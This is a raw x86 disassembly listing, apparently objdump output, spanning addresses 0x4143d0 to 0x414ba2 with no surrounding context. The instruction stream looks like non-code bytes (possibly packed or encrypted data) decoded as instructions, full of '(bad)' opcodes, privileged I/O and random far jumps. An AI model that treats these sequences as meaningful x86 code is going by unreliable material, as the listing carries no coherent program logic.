  4143d0:	and    eax,0xa0fdb5b
  4143d5:	or     BYTE PTR [esi],ah
  4143d7:	lahf   
  4143d8:	lods   eax,DWORD PTR ds:[esi]
  4143d9:	inc    eax
  4143da:	(bad)  
  4143db:	jnp    0x4143c5
  4143dd:	add    ecx,DWORD PTR [ebx-0x8]
  4143e0:	xchg   ebp,eax
  4143e1:	out    dx,al
  4143e2:	adc    bl,BYTE PTR [esi+0x6015d993]
  4143e8:	xchg   esp,eax
  4143e9:	ror    BYTE PTR [edx+0x772ef343],0x24
  4143f0:	mov    dh,0x2e
  4143f2:	mov    al,0xa8
  4143f4:	fadd   QWORD PTR [ecx+0x3]
  4143f7:	jge    0x4143ef
  4143f9:	dec    esi
  4143fa:	add    edi,ecx
  4143fc:	xor    DWORD PTR [ebp-0x644d3bb1],edi
  414402:	lds    edx,FWORD PTR [esi+0x4b]
  414405:	mov    ch,0x50
  414407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414408:	adc    ch,al
  41440a:	ins    DWORD PTR es:[edi],dx
  41440b:	jl     0x41439d
  41440d:	pop    edi
  41440e:	sbb    ebp,DWORD PTR [ebx-0x704157e5]
  414414:	std    
  414415:	mov    al,ds:0xfe57b6c0
  41441a:	push   cs
  41441b:	mov    DWORD PTR [ebp+0x4c],esi
  41441e:	inc    ebx
  41441f:	cmc    
  414420:	ja     0x414449
  414422:	jl     0x41442b
  414424:	jl     0x4143da
  414426:	out    dx,al
  414427:	mov    eax,ds:0x5aa22520
  41442c:	lods   al,BYTE PTR ds:[esi]
  41442d:	cs std 
  41442f:	sub    eax,0x47cf36b7
  414434:	add    eax,ebx
  414436:	and    dl,BYTE PTR [ebx+0x6]
  414439:	iret   
  41443a:	cld    
  41443b:	pop    edx
  41443c:	loop   0x41442e
  41443e:	jae    0x414479
  414440:	xchg   dl,al
  414442:	jbe    0x4143f2
  414444:	hlt    
  414445:	inc    esp
  414446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414447:	push   esi
  414448:	cwde   
  414449:	jg     0x4143e6
  41444b:	pop    esp
  41444c:	jmp    0x5788:0x3ca94773
  414453:	lahf   
  414454:	retf   0x9873
  414457:	push   ebx
  414458:	sub    ebp,DWORD PTR [eax+0x58]
  41445b:	lods   al,BYTE PTR ds:[esi]
  41445c:	(bad)  
  41445d:	test   al,0x38
  41445f:	pop    esp
  414460:	pop    esp
  414461:	imul   ebx,DWORD PTR [si-0x229e],0x7291001a
  41446a:	jmp    0x3b0a1f48
  41446f:	add    bh,BYTE PTR [edx]
  414471:	div    BYTE PTR [edx+0x30c76266]
  414477:	jno    0x414465
  414479:	mov    esp,0xbddffd6d
  41447e:	pop    ds
  41447f:	fldl2t 
  414481:	mov    ds:0x8e0ed9c7,eax
  414486:	sbb    eax,ebx
  414488:	dec    edi
  414489:	jge    0x414420
  41448b:	mov    DWORD PTR [esi+eiz*8-0x73],ebp
  41448f:	xor    BYTE PTR [ecx-0x3e41f1cd],bh
  414495:	add    DWORD PTR [esi-0x6890e5b1],edi
  41449b:	nop
  41449c:	mov    bh,0xa3
  41449e:	pop    esp
  41449f:	aad    0x5a
  4144a1:	fidiv  DWORD PTR [eax+0x6836a0be]
  4144a7:	test   esp,edi
  4144a9:	mov    dh,0x4c
  4144ab:	xchg   esp,eax
  4144ac:	mov    ecx,0xf582677f
  4144b1:	push   es
  4144b2:	cdq    
  4144b3:	fisub  DWORD PTR ds:0x8a79255d
  4144b9:	sbb    DWORD PTR [ecx],ebx
  4144bb:	daa    
  4144bc:	pop    DWORD PTR ds:0xc9cf9d7c
  4144c2:	in     al,0x27
  4144c4:	xor    al,0xd
  4144c6:	and    DWORD PTR [edx+0x252e8dd1],esi
  4144cc:	ja     0x414512
  4144ce:	pop    ebp
  4144cf:	fs test esp,ecx
  4144d2:	sub    eax,0xad29ce31
  4144d7:	mov    eax,0x250f8cf4
  4144dc:	gs repnz dec esi
  4144df:	xchg   esp,eax
  4144e0:	mov    edi,0x144d638a
  4144e5:	mov    esp,0x350303ec
  4144ea:	out    0xb2,eax
  4144ec:	cdq    
  4144ed:	cs data16 arpl sp,ax
  4144f1:	pop    edx
  4144f2:	int    0xc7
  4144f4:	dec    esi
  4144f5:	aas    
  4144f6:	sbb    ecx,DWORD PTR ds:0xb8c2606d
  4144fc:	xchg   DWORD PTR [eax],eax
  4144fe:	push   esp
  4144ff:	ret    0xe768
  414502:	fistp  QWORD PTR [edi]
  414504:	(bad)  
  414505:	cmc    
  414506:	pop    ecx
  414507:	out    dx,eax
  414508:	sbb    ecx,edi
  41450a:	hlt    
  41450b:	ss mov dh,ch
  41450e:	xor    edi,DWORD PTR [edx]
  414510:	and    al,0x5
  414512:	cdq    
  414513:	or     eax,0x9879273e
  414518:	sar    BYTE PTR [edx+eax*8+0x68c38009],cl
  41451f:	stc    
  414520:	rcr    BYTE PTR [ebx+0x47],1
  414523:	test   eax,0x1ed45062
  414528:	xchg   esi,eax
  414529:	dec    ecx
  41452a:	dec    ebp
  41452b:	pop    esp
  41452c:	in     al,0xc7
  41452e:	ror    BYTE PTR [ecx-0x50],1
  414531:	xor    esp,DWORD PTR [ebp+0x32783e37]
  414537:	jle    0x414587
  414539:	mov    cl,0x6
  41453b:	jg     0x414584
  41453d:	fcomp  QWORD PTR [edi]
  41453f:	push   cs
  414540:	stos   BYTE PTR es:[edi],al
  414541:	rol    BYTE PTR [ebp+0x62098b33],cl
  414547:	mov    gs,WORD PTR [eax-0x5f10a322]
  41454d:	mov    WORD PTR [eax-0x67],gs
  414550:	sub    BYTE PTR [ebp-0x17e190b7],al
  414556:	xchg   ecx,eax
  414557:	jmp    0x4b1d:0xe61af620
  41455e:	pavgw  mm7,QWORD PTR [ecx-0x6b]
  414562:	mov    bh,BYTE PTR [eax-0x6c]
  414565:	aaa    
  414566:	jecxz  0x414536
  414568:	push   cs
  414569:	xchg   edi,eax
  41456a:	ss cld 
  41456c:	pop    ebx
  41456d:	es dec esp
  41456f:	cwde   
  414570:	int    0x9
  414572:	dec    edx
  414573:	arpl   WORD PTR [esi-0x4873aa94],bx
  414579:	je     0x4145d7
  41457b:	inc    ebp
  41457c:	bound  ecx,QWORD PTR [ecx-0x66ef0330]
  414582:	jne    0x41456b
  414584:	or     edx,eax
  414586:	pop    ss
  414587:	cmp    DWORD PTR [edx+0x69],ebp
  41458a:	fmul   DWORD PTR ds:0x6333eee
  414590:	loopne 0x41451e
  414592:	or     DWORD PTR [esi+edx*1+0x55],edx
  414596:	push   edi
  414597:	xchg   edi,eax
  414598:	push   0x7f
  41459a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41459b:	mov    ds:0x7e0d56d,eax
  4145a0:	mov    eax,0x20b6276f
  4145a5:	int3   
  4145a6:	ret    
  4145a7:	dec    esi
  4145a8:	jp     0x4145df
  4145aa:	loop   0x4145a3
  4145ac:	push   esi
  4145ad:	cs (bad) 
  4145af:	xchg   esi,eax
  4145b0:	call   esp
  4145b2:	out    dx,al
  4145b3:	bound  edi,QWORD PTR [ebp-0x4e]
  4145b6:	push   ds
  4145b7:	call   0x1366:0x6124b1de
  4145be:	dec    esp
  4145bf:	inc    edx
  4145c0:	lock les esi,FWORD PTR [esi]
  4145c3:	cmp    esi,DWORD PTR [ebp+0x388bf053]
  4145c9:	xor    al,0x58
  4145cb:	and    edi,0x65
  4145ce:	icebp  
  4145cf:	adc    al,0x20
  4145d1:	lock je 0x4145b5
  4145d4:	in     al,0x36
  4145d6:	and    cl,BYTE PTR [eax]
  4145d8:	sbb    esi,DWORD PTR es:[ebp+0x13]
  4145dc:	sub    al,0xfb
  4145de:	data16 std 
  4145e0:	pop    edx
  4145e1:	clc    
  4145e2:	cmp    BYTE PTR [ebx-0x4c61157a],dh
  4145e8:	outs   dx,BYTE PTR ds:[esi]
  4145e9:	(bad)  
  4145eb:	or     ecx,eax
  4145ed:	clc    
  4145ee:	sar    al,0x53
  4145f1:	inc    ebp
  4145f2:	mov    ds:0x4f0f01f3,eax
  4145f7:	pusha  
  4145f8:	push   ecx
  4145f9:	or     eax,0x8f43aaa5
  4145fe:	(bad)  
  4145ff:	or     BYTE PTR [esi-0x67],cl
  414602:	xchg   esi,eax
  414603:	or     DWORD PTR [edi-0x5e9b603f],0xffffffaf
  41460a:	xor    eax,0x6b510714
  41460f:	fld    QWORD PTR [ecx-0x174d0b2c]
  414615:	leave  
  414616:	sbb    ebp,DWORD PTR [eax-0x58]
  414619:	mov    bh,dh
  41461b:	jecxz  0x4145ae
  41461d:	stos   BYTE PTR es:[edi],al
  41461e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41461f:	add    DWORD PTR [ebp-0x2c],ebx
  414622:	inc    esp
  414623:	rcr    ch,1
  414625:	inc    esp
  414626:	dec    ecx
  414627:	sub    BYTE PTR [eax],dl
  414629:	jmp    0x4145e1
  41462b:	std    
  41462c:	mov    ah,BYTE PTR [ebp+0x95fa994]
  414632:	ret    0xa861
  414635:	add    eax,0xd6a952ab
  41463a:	int    0x2a
  41463c:	dec    ecx
  41463d:	shl    DWORD PTR [edi-0x4d82c4ae],0xc5
  414644:	mov    ch,0xa0
  414646:	push   ds
  414647:	jp     0x41460f
  414649:	in     al,0xc7
  41464b:	(bad)  
  41464c:	in     eax,dx
  41464d:	cmp    DWORD PTR [ecx+0xd],esp
  414650:	inc    edx
  414651:	std    
  414652:	lods   eax,DWORD PTR ds:[esi]
  414653:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414654:	sub    ebp,DWORD PTR [ecx+0x59]
  414657:	sar    al,cl
  414659:	adc    BYTE PTR [ebp+0x2b],0x5
  41465d:	repnz adc DWORD PTR [eax+0x3d4c6dc2],esi
  414664:	xor    BYTE PTR [ebp-0x5a],ch
  414667:	xor    ebx,DWORD PTR ds:0x4c59fd60
  41466d:	inc    esp
  41466e:	mov    BYTE PTR [ecx-0x59],bl
  414671:	pop    DWORD PTR [ebx+0x2bf97e14]
  414677:	xchg   edx,eax
  414678:	push   ecx
  414679:	sub    ebx,DWORD PTR [ebp-0x75d4371c]
  41467f:	inc    ebx
  414680:	adc    eax,0xd8e194c7
  414685:	repz xchg edx,eax
  414687:	jle    0x4146cc
  414689:	push   edi
  41468a:	adc    eax,0x7ef870f8
  41468f:	sub    ah,ch
  414691:	sbb    BYTE PTR [eax-0x21],ah
  414694:	mov    dl,0xd2
  414696:	lds    ecx,FWORD PTR [ecx-0x78]
  414699:	in     al,dx
  41469a:	call   0x8ec3c039
  41469f:	add    DWORD PTR [ecx],esi
  4146a1:	sbb    ebx,ecx
  4146a3:	xchg   esp,eax
  4146a4:	sbb    edi,DWORD PTR [edi]
  4146a6:	jnp    0x414670
  4146a8:	outs   dx,DWORD PTR ds:[esi]
  4146a9:	push   0xffffffa9
  4146ab:	outs   dx,DWORD PTR ds:[esi]
  4146ac:	fdiv   DWORD PTR [eax-0xcf3f94a]
  4146b2:	pop    edx
  4146b3:	inc    edx
  4146b4:	xor    BYTE PTR [esi+0x7d],ch
  4146b7:	out    dx,al
  4146b8:	add    edx,edi
  4146ba:	(bad)  
  4146bb:	retf   
  4146bc:	les    eax,FWORD PTR [ebp+0x79bb6834]
  4146c2:	arpl   WORD PTR [edx+0x71],ax
  4146c5:	(bad)
  4146c9:	push   ss
  4146ca:	mov    fs,WORD PTR [ebx+esi*2]
  4146cd:	pusha  
  4146ce:	hlt    
  4146cf:	add    BYTE PTR [eax-0x66ecc5aa],dl
  4146d5:	mov    eax,ds:0x6ca096fb
  4146da:	push   0x8cffe7c9
  4146df:	mov    ebx,0x1a491e0e
  4146e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146e5:	idiv   DWORD PTR [ebx-0x5d768664]
  4146eb:	dec    ebx
  4146ec:	mov    ds:0xec2bef88,eax
  4146f1:	and    BYTE PTR [esi+ebx*8],ch
  4146f4:	inc    ebx
  4146f5:	mov    esp,0x292b80b7
  4146fa:	popf   
  4146fb:	aad    0x78
  4146fd:	jmp    0xb1653332
  414702:	jmp    0xa246d8c3
  414707:	aad    0x4a
  414709:	jle    0x4146d2
  41470b:	xchg   esi,eax
  41470c:	xor    eax,0x1e815e1e
  414711:	fxch   st(5)
  414713:	inc    ebp
  414714:	aaa    
  414715:	pop    ds
  414716:	js     0x41472c
  414718:	sbb    ecx,DWORD PTR [ebp+ebx*8+0x518fb59d]
  41471f:	ins    BYTE PTR es:[edi],dx
  414720:	mov    ah,0x47
  414722:	jp     0x414793
  414724:	pop    esp
  414725:	push   cs
  414726:	mov    bl,0x71
  414728:	imul   ecx,DWORD PTR [ebp-0x6d],0x89671193
  41472f:	push   ds
  414730:	dec    esi
  414731:	ins    DWORD PTR es:[edi],dx
  414732:	xlat   BYTE PTR ds:[ebx]
  414733:	cli    
  414734:	sbb    al,0x88
  414736:	mov    esi,0xddd67672
  41473b:	xlat   BYTE PTR ds:[ebx]
  41473c:	pop    ds
  41473d:	je     0x414765
  41473f:	add    al,0xc1
  414741:	xor    eax,DWORD PTR [edx+edi*8]
  414744:	add    al,0x63
  414746:	sahf   
  414747:	jle    0x414760
  414749:	mov    bh,0x18
  41474b:	call   0xeeff:0x966a971e
  414752:	outs   dx,DWORD PTR ds:[esi]
  414753:	jnp    0x41470a
  414755:	mov    esi,0xef3e2684
  41475a:	pop    ss
  41475b:	(bad)  
  41475d:	adc    al,0x9f
  41475f:	push   ebp
  414760:	mov    al,0x36
  414762:	pop    ebp
  414763:	add    eax,0x5f976f
  414768:	hlt    
  414769:	loope  0x414737
  41476b:	data16 rol al,cl
  41476e:	pop    ds
  41476f:	ror    BYTE PTR [ebx-0xc37bb77],cl
  414775:	sub    al,0xc6
  414777:	shr    dh,0xb7
  41477a:	mov    ecx,0x827d04dd
  41477f:	inc    edi
  414780:	mov    bh,0x8d
  414782:	cmp    ecx,eax
  414784:	stos   DWORD PTR es:[edi],eax
  414785:	ss sub al,0xc6
  414788:	cmp    al,0x36
  41478a:	(bad)  
  41478b:	(bad)  
  41478c:	adc    DWORD PTR [edi+0x55],ecx
  41478f:	jno    0x41473d
  414791:	and    edx,ebx
  414793:	push   ebx
  414794:	or     DWORD PTR [edx],edx
  414796:	dec    ebx
  414797:	ret    0x4c14
  41479a:	adc    eax,0x5bc4b90c
  41479f:	or     eax,DWORD PTR [ebx-0x2f]
  4147a2:	pusha  
  4147a3:	mov    ebx,0xfd5127a7
  4147a8:	lea    ebx,[ebx]
  4147aa:	jmp    0xf9ed:0x9868b7a
  4147b1:	or     DWORD PTR [edx+esi*1],ebx
  4147b4:	adc    ch,dl
  4147b6:	mov    ds:0xbc68d43c,eax
  4147bb:	inc    ecx
  4147bc:	inc    edx
  4147bd:	pop    ss
  4147be:	add    eax,DWORD PTR [eax-0x14]
  4147c1:	in     al,0x67
  4147c3:	jno    0x414765
  4147c5:	imul   edi,DWORD PTR [ebp+ebp*1+0x3345b6f7],0xffffffd8
  4147cd:	jmp    0x266f1e24
  4147d2:	popa   
  4147d3:	cwde   
  4147d4:	pop    ecx
  4147d5:	pop    edx
  4147d6:	and    bl,bh
  4147d8:	and    cl,bh
  4147da:	mov    ebx,0x75fb851
  4147df:	jnp    0x414833
  4147e1:	xchg   BYTE PTR [esi+0x3d],ch
  4147e4:	xor    cl,0xa9
  4147e7:	call   FWORD PTR [ecx+eiz*8]
  4147ea:	or     eax,0x64b81d73
  4147ef:	dec    edi
  4147f0:	imul   ebp,eax,0x10f69339
  4147f6:	aas    
  4147f7:	mov    bh,0xea
  4147f9:	add    DWORD PTR [eax],eax
  4147fb:	cmp    ch,bh
  4147fd:	cs fadd st,st(4)
  414800:	inc    ebp
  414801:	pop    ds
  414802:	ror    esp,cl
  414804:	inc    esi
  414805:	pop    ebp
  414806:	xlat   BYTE PTR ds:[ebx]
  414807:	sbb    esi,DWORD PTR [ecx-0x48]
  41480a:	fcmovb st,st(0)
  41480c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41480d:	or     al,0x5f
  41480f:	lods   eax,DWORD PTR ds:[esi]
  414810:	xchg   ecx,eax
  414811:	xchg   esi,eax
  414812:	js     0x41486f
  414814:	(bad)  
  414815:	mov    WORD PTR [esi],?
  414817:	jmp    0x4147cc
  414819:	es in  al,dx
  41481b:	jecxz  0x414828
  41481d:	and    ebx,edx
  41481f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414820:	fsubr  st,st(3)
  414822:	pop    eax
  414823:	enter  0x7d95,0x51
  414827:	lock retf 
  414829:	push   cs
  41482a:	mov    dl,BYTE PTR [edi+eiz*2-0x33]
  41482e:	lahf   
  41482f:	inc    edx
  414830:	sbb    dh,BYTE PTR [ecx]
  414832:	xlat   BYTE PTR ds:[ebx]
  414833:	shl    eax,1
  414835:	push   0xbf37389a
  41483a:	inc    edi
  41483b:	call   0xab3a:0x99fafd64
  414842:	push   ecx
  414843:	ss jne 0x414812
  414846:	jb     0x4147fd
  414848:	adc    al,BYTE PTR [ebx+edx*4]
  41484b:	lods   al,BYTE PTR ds:[esi]
  41484c:	daa    
  41484d:	lods   eax,DWORD PTR cs:[esi]
  41484f:	and    eax,0xc30982d0
  414854:	mov    bl,0x2a
  414856:	xchg   esp,eax
  414857:	cmp    eax,0xb05ac0ee
  41485c:	clc    
  41485d:	mov    WORD PTR [edx],?
  41485f:	jcxz   0x414885
  414862:	xor    BYTE PTR [ecx],bl
  414864:	pop    ds
  414865:	sub    ebp,ebp
  414867:	sub    eax,0x4eeb0a06
  41486c:	in     al,0xeb
  41486e:	mov    ch,0x7b
  414870:	es aad 0xad
  414873:	mov    esi,ebp
  414875:	or     BYTE PTR [ebx],0xbd
  414878:	cmp    dl,BYTE PTR [ebp-0x575d43d5]
  41487e:	mov    cl,dh
  414880:	lods   al,BYTE PTR ds:[esi]
  414881:	das    
  414882:	popf   
  414883:	jno    0x414879
  414885:	mov    cs,WORD PTR [eax-0x41aeea5]
  41488b:	jle    0x41483d
  41488d:	scas   eax,DWORD PTR es:[edi]
  41488e:	push   eax
  41488f:	sub    BYTE PTR [edx],ah
  414891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414892:	loop   0x414894
  414894:	xor    DWORD PTR [eax-0x66],esi
  414897:	ret    
  414898:	sar    BYTE PTR ds:0x2f47cdd1,1
  41489e:	inc    esp
  41489f:	push   edi
  4148a0:	aaa    
  4148a1:	mov    ds:0x7e6f4552,al
  4148a6:	pop    ss
  4148a7:	pop    esp
  4148a8:	jns    0x41482f
  4148aa:	add    esp,DWORD PTR [esi-0x65]
  4148ad:	les    eax,FWORD PTR [edi]
  4148af:	mov    esi,0xc50712a0
  4148b4:	xchg   ebx,eax
  4148b5:	cli    
  4148b6:	xor    dh,BYTE PTR [edx+0x53]
  4148b9:	repnz mov ecx,0xa16f8590
  4148bf:	rol    BYTE PTR [edx-0x7a823add],cl
  4148c5:	ins    DWORD PTR es:[edi],dx
  4148c6:	psrlw  mm3,QWORD PTR [eax-0x1b]
  4148ca:	xor    BYTE PTR [ebp+eax*1-0x27],bh
  4148ce:	mov    ah,0x3b
  4148d0:	ret    
  4148d1:	ror    cl,cl
  4148d3:	dec    edi
  4148d4:	out    0xb3,eax
  4148d6:	jge    0x41488a
  4148d8:	mov    dl,BYTE PTR [ebx-0x35]
  4148db:	dec    ecx
  4148dc:	and    DWORD PTR [ecx+ebx*8-0x57],eax
  4148e0:	test   eax,0xb5390e55
  4148e5:	xchg   BYTE PTR [ecx+edi*2],bl
  4148e8:	repnz sbb DWORD PTR [esi+ecx*1+0x61efad95],esi
  4148f0:	cli    
  4148f1:	push   ss
  4148f2:	stc    
  4148f3:	cld    
  4148f4:	push   ds
  4148f5:	fucom  st(2)
  4148f7:	xlat   BYTE PTR ds:[ebx]
  4148f8:	xor    ah,ch
  4148fa:	sub    edi,DWORD PTR [eax-0x2a]
  4148fd:	add    eax,0xb57621f2
  414902:	cmc    
  414903:	push   0x82eb0d75
  414908:	cmp    DWORD PTR [ebx+0x57],esi
  41490b:	jle    0x4148df
  41490d:	xor    BYTE PTR [esi],bh
  41490f:	ret    0xd0ae
  414912:	inc    ebx
  414913:	and    bh,BYTE PTR [esp+esi*4]
  414916:	add    edi,esp
  414918:	cmp    eax,DWORD PTR [ebp+0xd8189b1]
  41491e:	aas    
  41491f:	adc    bl,BYTE PTR [edx-0x35]
  414922:	inc    ebx
  414923:	cmp    ch,cl
  414925:	pop    edi
  414926:	mov    eax,ds:0x3a526ca4
  41492b:	sub    DWORD PTR [esi-0x75],0xffffffd0
  41492f:	rol    DWORD PTR [ebx+eax*8-0x4f7d9b99],1
  414936:	mov    dh,0xa9
  414938:	icebp  
  414939:	fidivr WORD PTR [ebp-0x2fa3a788]
  41493f:	loopne 0x41496f
  414941:	xor    cl,ah
  414943:	clc    
  414944:	adc    eax,0x5c264f37
  414949:	or     eax,ebx
  41494b:	call   0x270b:0xe3f671ac
  414952:	les    eax,FWORD PTR [edx]
  414954:	sbb    eax,0xe598fb
  414959:	jp     0x4149c1
  41495b:	inc    ebp
  41495c:	sbb    eax,0x4a2c769
  414961:	aad    0x4b
  414963:	mov    esi,edx
  414965:	call   0xd05202ac
  41496a:	mov    ebx,0x82548e75
  41496f:	cmp    dh,BYTE PTR [ebx+0x22]
  414972:	std    
  414973:	mov    ebp,0xeb851764
  414978:	pop    ebx
  414979:	add    eax,DWORD PTR [eax]
  41497b:	add    al,0xd6
  41497d:	dec    edx
  41497e:	dec    ecx
  41497f:	loop   0x414950
  414981:	out    dx,eax
  414982:	js     0x414944
  414984:	dec    esi
  414985:	mov    ds:0x70f54574,al
  41498a:	sub    DWORD PTR [esi-0x3f],ecx
  41498d:	(bad)  
  41498f:	sar    DWORD PTR [ebx],0x42
  414992:	inc    ecx
  414993:	scas   al,BYTE PTR es:[edi]
  414994:	sub    al,ch
  414996:	sbb    al,0x8a
  414998:	leave  
  414999:	pop    esi
  41499a:	std    
  41499b:	mov    ch,0x56
  41499d:	ret    
  41499e:	not    DWORD PTR [edi+0x33]
  4149a1:	enter  0x2588,0x43
  4149a5:	fadd   DWORD PTR [esi]
  4149a7:	xchg   esp,eax
  4149a8:	in     al,0x29
  4149aa:	cmp    edi,DWORD PTR [esi]
  4149ac:	test   al,0x41
  4149ae:	sbb    BYTE PTR [ebp+0x14],ch
  4149b1:	and    ebp,DWORD PTR [ecx-0x24fd983]
  4149b7:	call   0x3934:0xedb2bebd
  4149be:	out    0x58,al
  4149c0:	cmp    ecx,eax
  4149c2:	aaa    
  4149c3:	fadd   QWORD PTR ds:0x5145f0a7
  4149c9:	lock xor al,0x4f
  4149cc:	dec    ecx
  4149cd:	bound  esi,QWORD PTR [eax]
  4149cf:	lds    ecx,FWORD PTR ds:0x484123b2
  4149d5:	into   
  4149d6:	sub    al,0xbd
  4149d8:	cli    
  4149d9:	sahf   
  4149da:	sub    al,0x8e
  4149dc:	jne    0x414a37
  4149de:	retf   0xd0cd
  4149e1:	sub    edi,edx
  4149e3:	dec    esp
  4149e4:	pop    ebp
  4149e5:	lahf   
  4149e6:	jmp    0x4149a0
  4149e8:	cmp    dl,BYTE PTR [esi+0x55]
  4149eb:	add    BYTE PTR [ebx],bl
  4149ed:	push   0xb9193313
  4149f2:	aas    
  4149f3:	outs   dx,BYTE PTR ds:[esi]
  4149f4:	add    al,0x1e
  4149f6:	or     eax,0xa488d94b
  4149fb:	mov    gs,esi
  4149fd:	(bad)  
  4149fe:	imul   eax,DWORD PTR ds:0x963b86eb,0x496da040
  414a08:	add    DWORD PTR [ebx],0xffffff88
  414a0b:	add    al,0x82
  414a0d:	and    dh,ah
  414a0f:	adc    DWORD PTR [ecx],ecx
  414a11:	jnp    0x41499f
  414a13:	out    dx,eax
  414a14:	retf   
  414a15:	sbb    al,BYTE PTR [edx+0x3d]
  414a18:	nop
  414a19:	(bad)  
  414a1a:	das    
  414a1b:	scas   eax,DWORD PTR es:[edi]
  414a1c:	mov    fs,WORD PTR [esi-0x1d]
  414a1f:	mov    ds:0xc1ac79ab,al
  414a24:	out    0xa9,al
  414a26:	inc    edi
  414a27:	test   al,0x3
  414a29:	push   ebp
  414a2a:	sub    esp,esi
  414a2c:	add    al,0x99
  414a2e:	icebp  
  414a2f:	push   cs
  414a30:	mov    ds:0x6279cfa4,al
  414a35:	stos   DWORD PTR es:[edi],eax
  414a36:	sub    esi,DWORD PTR [edi+0xe]
  414a39:	mov    cl,0x62
  414a3b:	sbb    cl,0xdf
  414a3e:	add    cl,BYTE PTR [eax]
  414a40:	test   eax,0x3b788dd0
  414a45:	dec    eax
  414a46:	shr    DWORD PTR fs:[ebp+eax*4+0x545f22bc],0xd8
  414a4f:	dec    esi
  414a50:	and    eax,0xf130d09c
  414a55:	mov    ds:0x307ce597,eax
  414a5a:	daa    
  414a5b:	xchg   BYTE PTR [edi-0x4c29356d],dh
  414a61:	or     esi,esi
  414a63:	aas    
  414a64:	(bad)  
  414a65:	and    esp,DWORD PTR [esp+edi*2]
  414a68:	pushf  
  414a69:	ss dec esp
  414a6b:	dec    ecx
  414a6c:	xor    dl,BYTE PTR [ecx+0x17f83b3d]
  414a72:	adc    bh,BYTE PTR es:[ecx-0x3285d561]
  414a79:	into   
  414a7a:	xor    ecx,DWORD PTR [edx]
  414a7c:	stos   DWORD PTR es:[edi],eax
  414a7d:	pop    edx
  414a7e:	outs   dx,BYTE PTR ds:[esi]
  414a7f:	out    0xff,al
  414a81:	mov    edi,0x27b6fdd3
  414a86:	gs mov dl,0x4e
  414a89:	sub    ecx,edx
  414a8b:	sbb    DWORD PTR [ebp-0x533b76db],edx
  414a91:	bound  esi,QWORD PTR [ebx+edx*2]
  414a94:	fs stc 
  414a96:	xchg   edi,eax
  414a97:	stc    
  414a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a99:	(bad)  
  414a9a:	leave  
  414a9b:	mov    ch,0xb
  414a9d:	mov    edx,0x5027dc7
  414aa2:	(bad)  [ecx-0xa]
  414aa5:	cld    
  414aa6:	call   0xda016d90
  414aab:	mov    edi,0xc1107abe
  414ab0:	xor    eax,0x69fdf266
  414ab5:	pop    ecx
  414ab6:	leave  
  414ab7:	jo     0x414b31
  414ab9:	and    DWORD PTR [ebp-0x4164a5f1],eax
  414abf:	jecxz  0x414b01
  414ac1:	ret    
  414ac2:	jb     0x414a91
  414ac4:	sti    
  414ac5:	cmp    eax,0x22984a23
  414aca:	mov    edx,0xd9f3eaae
  414acf:	adc    esi,DWORD PTR [esi]
  414ad1:	jmp    0x414a73
  414ad3:	neg    BYTE PTR [eax]
  414ad5:	stos   DWORD PTR es:[edi],eax
  414ad6:	sahf   
  414ad7:	sub    DWORD PTR [ebx-0x16],ebx
  414ada:	imul   ecx,DWORD PTR [eax+0x62c42e4b]
  414ae1:	mov    al,0x57
  414ae3:	add    al,0xb4
  414ae5:	mov    dl,0x68
  414ae7:	(bad)  
  414ae8:	xor    BYTE PTR cs:[eax+0x16],bh
  414aec:	inc    DWORD PTR [ecx-0x67]
  414aef:	in     eax,0x33
  414af1:	jbe    0x414b0f
  414af3:	mov    ?,WORD PTR [ecx-0x30]
  414af6:	xchg   edx,eax
  414af7:	jp     0x414a9b
  414af9:	sub    DWORD PTR [edx+0x12705036],eax
  414aff:	pop    ds
  414b00:	dec    esi
  414b01:	popa   
  414b02:	push   es
  414b03:	sbb    dl,ch
  414b05:	or     al,BYTE PTR [ebx-0x6e]
  414b08:	or     BYTE PTR [esi-0x47],dh
  414b0b:	mov    dh,0xf4
  414b0d:	push   ebx
  414b0e:	push   esi
  414b0f:	pop    eax
  414b10:	ss mov esi,0x5d5d11e9
  414b16:	mov    edi,0xb4b4483a
  414b1b:	in     al,0x87
  414b1d:	popa   
  414b1e:	xor    BYTE PTR [eax+0x7c],0x15
  414b22:	(bad)  
  414b23:	cmp    BYTE PTR [esi],bh
  414b25:	adc    eax,0x6b3cc157
  414b2a:	pushf  
  414b2b:	mov    ebp,0x770a0f49
  414b30:	sub    al,0xdc
  414b32:	test   eax,0x77e30f52
  414b37:	xor    bh,BYTE PTR [ecx+0x2b1f5e35]
  414b3d:	add    al,0x33
  414b3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b40:	mov    ch,0xdf
  414b42:	push   es
  414b43:	shl    BYTE PTR [ebx-0x5d],1
  414b46:	sbb    eax,0x90fcbe6a
  414b4b:	dec    esp
  414b4c:	xchg   edi,eax
  414b4d:	dec    edx
  414b4e:	retf   0x9ff8
  414b51:	sti    
  414b52:	fnsave [esi-0x1935acc6]
  414b58:	pop    esp
  414b59:	mov    BYTE PTR cs:[edx+0x44a45b81],0x78
  414b61:	pop    esi
  414b62:	in     al,dx
  414b63:	or     DWORD PTR [esi],ecx
  414b65:	jns    0x414b29
  414b67:	jle    0x414af4
  414b69:	and    ebx,DWORD PTR [ebp-0x6fc83e06]
  414b6f:	pop    edi
  414b70:	test   BYTE PTR [ebp-0x7581042],ah
  414b76:	jb     0x414b86
  414b78:	pusha  
  414b79:	xchg   ebp,eax
  414b7a:	sub    al,0x41
  414b7c:	faddp  st(3),st
  414b7e:	shr    BYTE PTR [esi],1
  414b80:	sub    DWORD PTR [eax+0x2102d10c],eax
  414b86:	mov    al,ds:0x6f4c3793
  414b8b:	mov    WORD PTR [ecx-0x1f8cbdb],gs
  414b91:	ja     0x414b75
  414b93:	push   ss
  414b94:	aas    
  414b95:	dec    eax
  414b96:	ror    DWORD PTR [ecx],1
  414b98:	(bad)  [ecx+0x2b]
  414b9b:	dec    ecx
  414b9c:	pop    es
  414b9d:	sbb    DWORD PTR [bx+si+0x5f],ebp
  414ba1:	out    dx,eax
  414ba2:	mov    DWORD PTR [edi+0x16],edx
